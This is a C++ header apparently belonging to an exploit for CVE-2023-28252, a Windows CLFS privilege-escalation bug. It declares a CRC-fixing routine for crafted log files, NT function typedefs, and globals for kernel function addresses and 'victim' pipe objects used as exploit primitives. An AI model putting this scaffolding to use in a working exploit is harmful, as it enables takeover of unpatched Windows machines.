/*
 * @Date: 2026-11-09 08:46:27
 * @LastEditors: joe1sn joe1sn23333@gmail.com
 * @LastEditTime: 2026-11-11 19:08:41
 * @FilePath: \CVE_2023_28252\exp\CVE_2023_28252\def.hpp
 */
#pragma once
#include "include/common/memtools.hpp"
#include <random>
#include <string>
#include <stdint.h>
#include <string>
#include <Windows.h>
namespace CVE_2023_28252
{
    struct crc32
    {
        static void generate_table(uint32_t(&table)[256])
        {
            uint32_t polynomial = 0xEDB88320;
            for (uint32_t i = 0; i < 256; i++)
            {
                uint32_t c = i;
                for (size_t j = 0; j < 8; j++)
                {
                    if (c & 1) {
                        c = polynomial ^ (c >> 1);
                    }
                    else {
                        c >>= 1;
                    }
                }
                table[i] = c;
            }
        }

        static uint32_t update(uint32_t(&table)[256], uint32_t initial, const void* buf, size_t len)
        {
            uint32_t c = initial ^ 0xFFFFFFFF;
            const uint8_t* u = static_cast<const uint8_t*>(buf);
            for (size_t i = 0; i < len; ++i)
            {
                c = table[(c ^ u[i]) & 0xFF] ^ (c >> 8);
            }
            return c ^ 0xFFFFFFFF;
        }
    };

    struct pairPipe {
        HANDLE r;
        HANDLE w;
    };
    typedef struct _IO_STATUS_BLOCK {
        union {
            NTSTATUS Status;
            PVOID Pointer;
        } DUMMYUNIONNAME;

        ULONG_PTR Information;
    } IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

    typedef VOID(NTAPI* PIO_APC_ROUTINE)(
        _In_ PVOID ApcContext,
        _In_ PIO_STATUS_BLOCK IoStatusBlock,
        _In_ ULONG Reserved
        );

    typedef NTSTATUS(WINAPI* PNtFsControlFile)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);


    static std::mt19937_64& GetRandomEngine();
    std::wstring RandomUIntWString(uint64_t min, uint64_t max,
        int precision = -1, int base = 10);

    int crcCalculatorAndFix(char* mybuf, int mysize);
    bool fixCRCFile(std::wstring filepath);
    void getVirtualFunction();
    void getVirtualAddress();

    inline constexpr DWORD BaseBlockSize = 0x7a00;
    inline constexpr DWORD NormalBlockSize = 0x400;
    inline constexpr ULONG ClfsTagName = 'sflC';

    inline ULONG_PTR fnClfsEarlierLsn;
    inline ULONG_PTR fnPoFxProcessorNotification;
    inline ULONG_PTR fnClfsMgmtDeregisterManagedClient;
    inline ULONG_PTR para_PipeAttributeobjInkernel;
    inline ULONG_PTR fnSeSetAccessStateGenericMapping;
    inline pairPipe g_VictimPipes;

    inline PNtQuerySystemInformation fnNtQuerySystemInformation;
    inline PNtFsControlFile NtFsControlFile;

} // namespace CVE_2023_28252

